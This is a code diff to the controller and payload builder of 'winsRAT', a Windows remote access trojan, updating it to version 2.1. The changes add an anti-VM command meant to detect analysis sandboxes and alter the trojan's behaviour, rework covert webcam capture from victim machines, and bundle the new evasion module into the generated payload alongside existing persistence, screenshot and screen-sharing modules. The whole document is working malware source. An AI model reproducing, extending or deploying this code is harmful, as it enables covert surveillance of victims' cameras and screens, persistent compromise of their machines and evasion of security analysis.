@@ -11,6 +11,7 @@ import shutil
 import threading
 import platform
 import queue
+import pickle
 import PyInstaller.__main__
 from datetime import datetime
 
@@ -30,7 +31,7 @@ echo " |   |                                            |   | ";
 echo " |___|                                            |___| ";
 echo "(_____)------------------------------------------(_____)";
 
-                    %s v1.0 @hash3liZer/@TheFlash2k
+                    %s v2.1 @hash3liZer/@TheFlash2k
                        Improve by ThemeHackers
 """
 
@@ -153,6 +154,7 @@ class PULL:
             ('screenshot', 'Take Screenshot on Target Machine and Save on Local'),
             ('screenshare' , 'Take Screenshot on Target Machine and Share in Real Time'),
             ('webcam', 'Capture Webcam Image and Save on Local'),
+            ('antivm' , 'Check if the target is a VM to change the behavior of winsRAT.'),
             ('exit', 'Exit from winsRAT!')
             
             
@@ -266,6 +268,13 @@ class PULL:
         print("Example    : \n")
         print("$ webcam")
         sys.stdout.write("\n")
+    def help_c_antivm(self):
+        sys.stdout.write("\n")
+        print("Info       : Check if the target machine is a virtual machine!")
+        print("Arguments  : None")
+        print("Example    : \n")
+        print("$ antivm")
+        sys.stdout.write("\n")
     def help_overall(self):
         global __HELP_OVERALL__
         print(__HELP_OVERALL__)
@@ -318,7 +327,7 @@ class CLIENT:
 
         except ConnectionResetError:
             self.STATUS = "Disconnected"
-            print("[!] Connection reset by remote host (server ถูกปิด)")
+            print("[!] Connection reset by remote host (May be closed)")
         except Exception as e:
             self.STATUS = "Error"
             print(f"[!] Unexpected error: {e}")
@@ -371,6 +380,8 @@ class COMMCENTER:
                 pull.help_c_screenshare()
             elif vals[1] == "webcam":
                 pull.help_c_webcam()
+            elif vals[1] == "antivm":
+                pull.help_c_antivm()
             else:
                 pull.error("Invalid Command!")
         else:
@@ -530,42 +541,57 @@ class COMMCENTER:
             pull.print("Saved: [" + pull.DARKCYAN + fullpath + pull.END + "]")
         else:
             pull.error("You need to connect before execute this command!")
-    def c_screenshare(self):
-        from mods.screenshare import ScreenShareServer
-        ScreenShareServer().start_server()
 
-    def c_webcam_capture(self):
-        from mods.webcam import Webcam
-        webcam = Webcam(max_devices=10)  
+    
+    def c_webcam(self):
+        if self.CURRENT:
+            self.CURRENT[1].send_data("webcam:")
+            result = self.CURRENT[1].recv_data()
+            
+            # Unpack multiple camera images
+            try:
+                cam_data = pickle.loads(result) # dict: { cam_id: bytes }
 
-        results = webcam.capture_all()
+                if "error" in cam_data:
+                    pull.error(f"[WEBCAM ERROR] {cam_data['error'].decode(errors='ignore')}")
+                    pull.error(f"[_error.png] It is possible that the target does not have webcam equipment !")
+                else:
+                    for cam_id, img_bytes in cam_data.items():
+                        with open(f"{cam_id}.png", "wb") as f:
+                            f.write(img_bytes)
+                        pull.print(f"[+] Saved: {cam_id}.png")  
 
-        if not webcam.SUCCESS:
-            print("No webcam images captured.")
-            return
+                dirname = os.path.join(os.path.dirname(__file__), 'webcam', self.CURRENT[1].ip)
+                os.makedirs(dirname, exist_ok=True)
 
-        base_dir = "webcam"
-        client_ip = webcam.client_info.ip
+                for cam_id, img_data in cam_data.items():
+                    filename = f"{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}_{cam_id}.png"
+                    fullpath = os.path.join(dirname, filename)
+                    with open(fullpath, 'wb') as fl:
+                        fl.write(img_data)
 
-        if not os.path.isdir(base_dir):
-            os.mkdir(base_dir)
+                    pull.print("Saved: [" + pull.DARKCYAN + fullpath + pull.END + "]")
 
-        ip_dir = os.path.join(base_dir, client_ip)
-        if not os.path.isdir(ip_dir):
-            os.mkdir(ip_dir)
+            except Exception as e:
+                pull.error(f"[!] Failed to decode webcam images: {str(e)}")
 
-        for index, data in results.items():
-            timestamp = datetime.now().strftime("%d-%m-%Y_%H-%M-%S")
-            filename = f"webcam_{index}_{timestamp}.png"
-            fullpath = os.path.join(ip_dir, filename)
+        else:
+            pull.error("You need to connect before execute this command!")
 
-            with open(fullpath, "wb") as f:
-                f.write(data)
-            if pull:
-                pull.print("Saved: [" + pull.DARKCYAN + fullpath + pull.END + "]")
-            else:
-                print(f"[✓] Saved image from camera {index}: {fullpath}")
 
+
+    def c_screenshare(sock):
+        from mods.screenshare import ScreenShareServer  
+        
+        ssc = ScreenShareServer()
+        ssc.start_server()  
+        
+    def c_antivm(sock):
+        from mods.antivm import AntiVM
+        
+        detected = AntiVM.detect(verbose=True)
+        resp = "[OK] No VM detected." if not detected else "[!] VM detected."
+        sock.send(base64.b64encode(resp.encode()) + b")J@NcRfU")
 
 
     def c_exit(self):
@@ -585,7 +611,7 @@ class INTERFACE(COMMCENTER):
         self.SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
             self.SOCKET.bind((self.address, self.port))
-            pull.print("Successfuly Bind to %s%s:%i" % (
+            pull.print("Successfully Bind to %s%s:%i" % (
                 pull.RED,
                 self.address,
                 self.port,
@@ -650,14 +676,16 @@ class INTERFACE(COMMCENTER):
             elif vals[0] == "screenshare":
                 self.c_screenshare()
             elif vals[0] == "webcam":
-                self.c_webcam_capture()
+                self.c_webcam()
+            elif vals[0] == "antivm":
+                self.c_antivm()
             else:
                 pull.error("Invalid Command!")
         else:
             pull.error("Invalid Syntax!")
 
     def launch(self):
-        pull.print("Launching Interface! Enter 'help' to get avaible commands! \n")
+        pull.print("Launching Interface! Enter 'help' to get available commands! \n")
 
         while True:
             val = pull.get_com(self.CURRENT)
@@ -687,6 +715,7 @@ class GENERATOR:
         self.v_client  = self.get_client()
         self.v_main    = self.get_main()
         self.v_webcam  = self.get_webcam()
+        self.v_antivm  = self.get_antivm()
 
     def get_output(self, out):
         rtval = ""
@@ -765,7 +794,13 @@ class GENERATOR:
         data = fl.read()
         fl.close()
         return data
+    def get_antivm(self):
+        topen = os.path.join(self.pather, 'antivm.py')
+        fl = open(topen, encoding='utf-8')
 
+        data = fl.read()
+        fl.close()
+        return data
     def get_client(self):
         topen = os.path.join(self.pather, 'client.py')
         fl = open(topen, encoding='utf-8')
@@ -797,7 +832,7 @@ class GENERATOR:
         time.sleep(2)
         pull.function("Compiling modules ... ")
         self.data = self.v_imports + "\n\n" + self.v_consts + "\n" + self.v_persistence + "\n" + self.v_sysinfo + "\n\n" + \
-                self.v_screenshot + "\n\n" + self.v_screenshare + "\n\n" + self.v_webcam + "\n\n" + self.v_client + "\n\n" + self.v_main
+                self.v_screenshot + "\n\n" + self.v_screenshare + "\n\n" + self.v_webcam + "\n\n" + self.v_antivm + "\n\n" + self.v_client + "\n\n" + self.v_main
         time.sleep(2)
         pull.function("Generating source code ...")
         fl = open(self.output, 'w')
@@ -810,8 +845,8 @@ class GENERATOR:
     def generate(self):
         time.sleep(2)
         pull.function("Compiling modules ... ")
-        self.data = self.v_imports + "\n\n" + self.v_consts + "\n\n" + self.v_persistence + "\n\n" + self.v_sysinfo + "\n\n" + \
-                self.v_screenshot + "\n\n" + self.v_screenshare + "\n\n" + self.v_client + "\n\n" + self.v_main
+        self.data = self.v_imports + "\n\n" + self.v_consts + "\n" + self.v_persistence + "\n" + self.v_sysinfo + "\n\n" + \
+                self.v_screenshot + "\n\n" + self.v_screenshare + "\n\n" + self.v_webcam + "\n\n" + self.v_antivm + "\n\n" + self.v_client + "\n\n" + self.v_main
         time.sleep(2)
         pull.function("Generating one time code for binary ")
         self.flname = self.tmp_dir()
